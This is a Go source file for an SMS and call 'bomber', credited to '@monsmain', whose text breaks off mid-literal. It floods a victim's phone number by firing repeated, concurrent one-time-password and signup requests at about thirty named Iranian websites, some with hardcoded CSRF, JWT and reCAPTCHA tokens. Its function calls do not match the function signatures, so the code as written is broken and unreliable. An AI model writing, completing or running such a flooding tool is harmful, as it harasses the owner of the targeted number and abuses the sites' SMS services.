// faghat teste code
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"  
        "net/http/cookiejar"  
)
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
	}
}//Code by @monsmain
//(faghat baraye site payagym.com)
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p) 
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p 
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}
func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*40)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*40)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {

		// nikanbike.com (SMS - POST Form) - نیاز به rand و verify_token (ممکن است پویا باشند)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("controller", "authentication")
			formData.Set("ajax", "true")
			formData.Set("back", "my-account")
			formData.Set("fc", "module")
			formData.Set("module", "iverify")
			formData.Set("phone_mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("account_type", "individual")
			formData.Set("force_sms", "0")
			formData.Set("SubmitCheck", "ایجاد حساب کاربری")
			formData.Set("verify_token", "alhLVzFLMitONHFCRDY3enRTd3Mzdz09") // ممکن است پویا باشد
			sendFormRequest(ctx, "https://nikanbike.com/?rand=1745917742131", formData, &wg, ch) // rand ممکن است پویا باشد
		}

		// elecmarket.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "stm_login_register")
			formData.Set("type", "mobile")
			formData.Set("input", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://elecmarket.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// ickala.com (SMS - POST Form) - tokensms ممکن است پویا باشد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("controller", "authentication")
			formData.Set("SubmitCreate", "1")
			formData.Set("ajax", "true")
			formData.Set("email_create", "") // طبق نمونه شما خالی ارسال می‌شود
			formData.Set("otp_mobile_num", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("lbm_id_country", "112")
			formData.Set("OPTnotrequired", "0")
			formData.Set("back", "my-account")
			formData.Set("tokensms", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NDU5MTgwMTEsImlzcyI6InBvb3lhLmlja2FsYS5zbXMiLCJuYmYiOjE3NDU5MTgwMTEsImV4cCI6MTc0NTkxODMxMSwidXNlck5hbWUiOiJhZG1pbnBvb3lhIn0.52lT5haqxD6rg6aknIfCppNR4Hyc7noK3v3N5Laadqop3vL9XeuLN0sEsImKVzh73Wick70q0MogVwPMF68l5A") // ممکن است پویا باشد
			sendFormRequest(ctx, "https://ickala.com/", formData, &wg, ch)
		}

		// meidane.com (SMS - POST Form) - نیاز به csrfmiddlewaretoken پویا (احتمال عدم موفقیت بالا)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("csrfmiddlewaretoken", "Aak7CicLIIOWxHuijeEkp3z1xTnr4bz8Dk1xFNXze4orEfRXaOhcn32CwN84rUon") // این توکن پویا است و باید از صفحه لاگین اصلی استخراج شود
			formData.Set("phone_number", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://meidane.com/accounts/Login", formData, &wg, ch)
		}

		// mahouney.com (SMS - GET)
		wg.Add(1)
		tasks <- func() {
			// ساخت URL با پارامترهای GET
			url := fmt.Sprintf("https://mahouney.com/fa/Account/LoginOrRegisterWithVerifyCode?viewResult=ValidateByVerifyCode&MobaileNumber=%s&UserStatuse=Register&ReturnUrl=%s", phone, url.QueryEscape("https://mahouney.com/"))
			sendGETRequest(ctx, url, &wg, ch)
		}

		// adinehbook.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("path", "/gp/css/homepage.html")
			formData.Set("action", "sign")
			formData.Set("phone_cell_or_email", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("login-submit", "تایید")
			sendFormRequest(ctx, "https://www.adinehbook.com/gp/flex/sign-in.html", formData, &wg, ch)
		}

		// maxbax.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "bakala_send_code")
			formData.Set("phone_email", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://maxbax.com/bakala/ajax/send_code/", formData, &wg, ch)
		}

		// mellishoes.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("endp", "step-2")
			formData.Set("redirect_to", "") // طبق نمونه شما خالی ارسال می‌شود
			formData.Set("action", "nirweb_panel_login_form")
			formData.Set("nirweb_panel_username", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://mellishoes.ir/panel/?endp=step-2", formData, &wg, ch)
		}

		// hiss.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "bakala_send_code")
			formData.Set("phone_email", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://hiss.ir/bakala/ajax/send_code/", formData, &wg, ch)
		}

		// nalinoco.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("step", "1")
			formData.Set("ReturnUrl", "/")
			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://www.nalinoco.com/api/customers/login-register", formData, &wg, ch)
		}

		// manoshahr.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("token", "") // طبق نمونه خالی ارسال می‌شود
			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("id_parent_m", "0")
			formData.Set("view", "1200px")
			formData.Set("class_name", "public_login")
			formData.Set("function_name", "sendCode")
			formData.Set("id_load", "login_mdm")
			formData.Set("return_id_val", "") // طبق نمونه خالی ارسال می‌شود
			formData.Set("id_parent", "") // طبق نمونه خالی ارسال می‌شود
			formData.Set("page", "") // طبق نمونه خالی ارسال می‌شود
			formData.Set("user", "manoshahr")
			sendFormRequest(ctx, "https://manoshahr.ir/jq.php", formData, &wg, ch)
		}

		// bartarinha.com (SMS - POST Form) - نیاز به __RequestVerificationToken پویا (احتمال عدم موفقیت بالا)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("__RequestVerificationToken", "aax6H3F5_Cz-TTcmLggGbc_APGbGguMSKG6gNTdQgBb-lqmzdCamPivSPy2PAjynRrxI_geB9IBKsFJXWAu96mKzElE1") // این توکن پویا است
			formData.Set("mobileNo", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("X-Requested-With", "XMLHttpRequest") // طبق نمونه ارسال می‌شود
			sendFormRequest(ctx, "https://bartarinha.com/Advertisement/Users/RequestLoginMobile", formData, &wg, ch)
		}

		// payagym.com (SMS - POST Form - مرحله ۱) - نیاز به توکن‌های پویا و فرمت دهی خاص شماره تلفن
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			// استفاده از تابع کمکی محلی برای فرمت دهی شماره تلفن با فاصله
			formattedPhone := formatPhoneWithSpaces(phone)

			formData.Set("digits_phone", formattedPhone) // شماره تلفن با فاصله (مثال: 912 345 6456)
			formData.Set("login_digt_countrycode", "+98") // کد کشور جداگانه
			formData.Set("action_type", "phone")
			formData.Set("rememberme", "1")
			formData.Set("digits", "1")
			formData.Set("instance_id", "b7eb3adbaa8742f85bcf97b64fd2e8c5") // ممکن است پویا باشد
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "login")
			formData.Set("digits_step_1_type", "") // طبق نمونه خالی
			formData.Set("digits_step_1_value", "") // طبق نمونه خالی
			formData.Set("digits_step_2_type", "") // طبق نمونه خالی
			formData.Set("digits_step_2_value", "") // طبق نمونه خالی
			formData.Set("digits_step_3_type", "") // طبق نمونه خالی
			formData.Set("digits_step_3_value", "") // طبق نمونه خالی
			formData.Set("digits_login_email_token", "") // طبق نمونه خالی
			formData.Set("digits_redirect_page", "//payagym.com/?page=1&redirect_to=https%3A%2F%2Fpayagym.com%2F") // ممکن است پویا باشد
			formData.Set("digits_form", "5b78541bad") // ممکن است پویا باشد
			formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Fpayagym.com%2F") // ممکن است پویا باشد
			formData.Set("aio_special_field", "") // طبق نمونه خالی
			formData.Set("show_force_title", "1")

			sendFormRequest(ctx, "https://payagym.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// primashop.ir (SMS - POST Form - مرحله ۱) - نیاز به csrf_token پویا (احتمال عدم موفقیت بالا)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("route", "extension/module/websky_otp/send_code")
			formData.Set("telephone", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("csrf_token", "c0bbc562c74de6362204d4cecf2b96f3c2b9842c70c3cb26864c3a84e495cdf5") // این توکن پویا است
			sendFormRequest(ctx, "https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", formData, &wg, ch)
		}

		// rubeston.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("step", "1")
			formData.Set("ReturnUrl", "/")
			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://www.rubeston.com/api/customers/login-register", formData, &wg, ch)
		}

		// panel.hermeskala.com (SMS - POST JSON)
		wg.Add(1)
		tasks <- func() {
			payload := map[string]interface{}{
				"mobile": phone, // استفاده مستقیم از شماره تلفن ورودی در ساختار JSON
			}
			sendJSONRequest(ctx, "https://panel.hermeskala.com/api/v1/signup", payload, &wg, ch)
		}

		// badparak.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://badparak.com/register/request_verification_code", formData, &wg, ch)
		}

		// kavirmotor.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phoneNumber", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://kavirmotor.com/sms/send", formData, &wg, ch)
		}

		// baradarantoy.ir (Registration - POST Form) - ممکن است Rate Limit شود یا حساب dummy ایجاد کند
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("txt_name", "suhe") // پارامترهای ثابت از نمونه شما
			formData.Set("txt_famil", "rrerrer")
			formData.Set("txt_pass", "4TSVfkaDQF3Je3H")
			formData.Set("txt_pass2", "4TSVfkaDQF3Je3H")
			formData.Set("txt_city", "susghhusd")
			formData.Set("txt_tel", "02165665554") // این شماره ثابت است در نمونه شما
			formData.Set("txt_mobile", phone)     // شماره تلفن هدف
			formData.Set("txt_gender", "1")
			formData.Set("txt_address", "ffsuhs sufhsuf suhufus")
			formData.Set("txt_job", "فروش در شبکه های مجازی")
			// پارامترهای خالی از نمونه شما
			formData.Set("undefined", "on") // این پارامتر عجیبی است، طبق نمونه اضافه شد
			formData.Set("moaref", "")
			formData.Set("UregEmail", "")
			formData.Set("section", "reg")
			formData.Set("submit", "true")
			sendFormRequest(ctx, "http://civapp.ir/ajaxRegister.php", formData, &wg, ch)
		}

		// hsaria.com (SMS - POST JSON) - استفاده از فرمت بدون صفر اول
		wg.Add(1)
		tasks <- func() {
			payload := map[string]interface{}{
				"phone": getPhoneNumberNoZero(phone), // حذف صفر اول
			}
			sendJSONRequest(ctx, "https://hsaria.com/MemberRegisterLogin", payload, &wg, ch)
		}

		// setshoe.ir (SMS - POST Form) - نیاز به security token پویا (احتمال عدم موفقیت بالا)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "mreeir_send_sms")
			formData.Set("mobileemail", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("userisnotauser", "") // طبق نمونه خالی
			formData.Set("type", "mobile")
			formData.Set("captcha", "") // طبق نمونه خالی
			formData.Set("captchahash", "") // طبق نمونه خالی
			formData.Set("security", "00daaf7c4b") // این توکن پویا است
			sendFormRequest(ctx, "https://setshoe.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// karlancer.com (Registration - POST JSON) - Endpoint ثبت نام، verify_token به نظر ورودی OTP است
		wg.Add(1)
		tasks <- func() {
			payload := map[string]interface{}{
				"phone":        phone, // استفاده مستقیم از شماره تلفن ورودی
				"role":         "freelancer",
				"verify_token": 984402, // این به نظر ورودی OTP است، ممکن است این Endpoint برای ارسال نباشد
			}
			sendJSONRequest(ctx, "https://www.karlancer.com/api/register", payload, &wg, ch)
		}

		// igame.ir (SMS - POST JSON) - نیاز به cfToken پویا (احتمال عدم موفقیت بالا)
		wg.Add(1)
		tasks <- func() {
			payload := map[string]interface{}{
				"phone":   phone, // استفاده مستقیم از شماره تلفن ورودی
				"cfToken": "0.yZYYRcI8jD6Y-BzkcNMAHLWnyEcavZL6ZdpLJlpHcxSeU_EAF4i9FjR3kq5GWPdVnOLQRtme01gZVavhTgeFQAuo7yKPcV_vbDUIqZIKktEIA1iXaWumIDBxcaOEj_V6MFXTdHHYmdGNxh-yL9IxNtkuNFdYOq6R5ya_AR7qhXrqESvDWHnIxb27HhmIRzNMqePv6o-I9YLrHr11YoMkOTsOZsQrvGusXFITYIsUWHY1SewezzRskLTpxoWeW0W66Db5Mh5HVjdxMhXtD2uZOux-VcHqHNicxLig1Q1zJgcnCOw8BXh7OuEZVh1uN9AlJVD3KUIbHwZW3gbWLfWLHaCQ-4Zecd3f1OKOhss3xkXN1LQsWKrKd-mvcuiqwmbTPW-CNN0LiV2fCy027tC-W5V2G5niXD9phW4ySJgkpjWrk1qUcehJox_n8I5dXWQArMkqm5o_knPiDrgLqhltA-sc3JNyKjeRD69tBv-uyrvAsQDOytnVhJ3a0dNuk_fIpVjPNNaaLeu47bQdgOayspVf8VqkfYGikw20zP_Gmq92exhExElTidG-A-X9ntb0GJq_EpThB8n2yY5NaQ0HgVtFlMDLe-zR9z-uHbVKZbh8T7KodfkutLiKztITHix9Bx3Gp8q6W3NIE8gknuH-nWhenec9hj2HXHi7zEBNDN8cbzNUq6YHD6kqukEpB0xNFaTkYfsUPu6rWOJJY1FsZOlJxJJJyAv60-hBMdKrITFn2odK6T-osqim5ouvFnbudsngMFceTG-C9KOSFznmUK-cUEfPvEB_LHGC88KvTzgW3-xRGsoo-99BABk0svsWmkQrGwj36q1kwBPxQTaR6Q.SLFJ7OPwcLWbK_3lTa_B-w.548dd5e52d15044690d0c322b96a7eb523f6f81c9fb7ea3904420a9d731b16b7", // این توکن پویا است
			}
			sendJSONRequest(ctx, "https://igame.ir/Login/SendOtpCode", payload, &wg, ch)
		}

		// hamrahsport.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("cell", phone) // استفاده مستقیم از شماره تلفن ورودی
			formData.Set("name", "Kdkfjdj") // ارسال پارامتر ثابت از نمونه
			formData.Set("agree", "1")
			formData.Set("send_otp", "1")
			formData.Set("otp", "") // طبق نمونه خالی
			sendFormRequest(ctx, "https://hamrahsport.com/send-otp", formData, &wg, ch)
		}

		// www.ketabium.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("username", phone) // استفاده مستقیم از شماره تلفن ورودی
			sendFormRequest(ctx, "https://www.ketabium.com/login-register", formData, &wg, ch)
		}

		// api.digighate.com (SMS - POST JSON) - نیاز به recaptchaToken پویا (احتمال عدم موفقیت بالا)
		wg.Add(1)
		tasks <- func() {
			payload := map[string]interface{}{
				"phone":          phone, // استفاده مستقیم از شماره تلفن ورودی
				"recaptchaToken": "03AFcWeA5QGfoyI0WJFc59NKICiRxpBHxfLgNvwgWZxHQPxkJHpKTe3MFXDEJ9sVIPikTYjpikEfCAZI0VqfYoo0zZk0Nt7yrJfZ-8qyjimyMD9z2YtVnfr0VV_-O7bAcxygAY7vQX0VBRzHR4LoZsqn7N0wtbOmFtanEiPALUOpdm8FMMTb9ey8meIAvuM8q6XLJMCXrhBlkevyHcEOzONULbAR2kLliX8tJkE9SDGK1UsIoKsM5dvhy_w1kxJii0Z8oXEg_ss0whrUyHnMs9IoET3OCYzsqhPHHMg5YejZ90RKAGutZ5BRk-O9klC41FlAXuTQtYbiQY0O9mKr65cmvZokOMbJsIefx6-TIaxbKJu-pukmvjrT4iZNCdo_OlhDboOBr1peK-oBhyJN0p802b0NDBU6DSSZPcQnX7uEIzwfYCUdmLhtGH6qs2V74hqynNJ_EosYElbTStbRPPm9JcT5Mb9QlOZRebzWBzCTN9KnKMDufEmT-3MXxAUwj2AhhG7qZvoFo3c5tUN809CwaAbnTYZaAFSYtbxU5ds_myQ8pvpg-ujXBCbdLQwWnIWNQmzZVob8rPZ6SqujErykgafbSc8EJJM6_ZzAXOV34iEa3lpa6am081D6_tBasrYtzeNCOsHN_ngIJH1Rdt67iXrpfgrSKLZDLb26IQpN7Kd-njaleV8uFx41PhT-gY83dCfCNLl4LnMunVVrHefYDtGcHbY3xzosAAab3pcN7FjEMIMxcFKawA024BgfT6h3sp_-ioxuAC6wI-F0W60VbUMWetR4QVVGw4IuDsdBJ6JBxyrEC74XAeilVkWHAOZbqy2McaA8wK-pv1lQVn9uBFivRn3T_BxNRty3OT7FnM4j5Qw1wM2n6_bFqv2EbRCjOi2CFugzSADE3-3spESvI2AsnXm2PfMw", // این توکن reCAPTCHA است و پویاست
			}
			sendJSONRequest(ctx, "https://api.digighate.com/auth/otp", payload, &wg, ch)
		}

		// api.hovalvakil.com (SMS - GET)
		wg.Add(1)
		tasks <- func() {
			// ساخت URL با پارامتر GET
			url := fmt.Sprintf("https://api.hovalvakil.com/api/User/SendConfirmCode?userName=%s", phone) // استفاده مستقیم از شماره تلفن ورودی در URL
			sendGETRequest(ctx, url, &wg, ch)
		}

		// martday.ir (Registration - POST Form) - از فیلد email برای شماره تلفن استفاده می کند
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("email", phone) // استفاده از شماره تلفن در فیلد email
			formData.Set("accept_term", "on")
			sendFormRequest(ctx, "https://martday.ir/api/customer/member/register/", formData, &wg, ch)
		}

		// civapp.ir (Registration - POST Form) - HTTP, نه HTTPS - Endpoint ثبت نام
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
			// پارامترهای ثابت و خالی از نمونه شما
			formData.Set("undefined", "on") // پارامتر عجیب
			formData.Set("regRePass", "1234567890")
			formData.Set("regPass", "1234567890")
			formData.Set("moaref", "")
			formData.Set("UregEmail", "")
			formData.Set("name", "uduhe eiutui")
			formData.Set("section", "reg")
			formData.Set("submit", "true")
			sendFormRequest(ctx, "http://civapp.ir/ajaxRegister.php", formData, &wg, ch) // توجه: HTTP
		}

		// web-api.fafait.net (GraphQL - POST JSON) - ساختار JSON پیچیده، نیاز به بررسی بیشتر برای کارکرد صحیح
		wg.Add(1)
		tasks <- func() {
			// ساختار پیچیده GraphQL JSON بر اساس نمونه شما
			payload := map[string]interface{}{
				"variables": map[string]interface{}{
					"input": map[string]interface{}{
						"mobile":   phone,         // استفاده مستقیم از شماره تلفن ورودی
						"nickname": "dfdfidf sadef", // پارامتر ثابت از نمونه
					},
				},
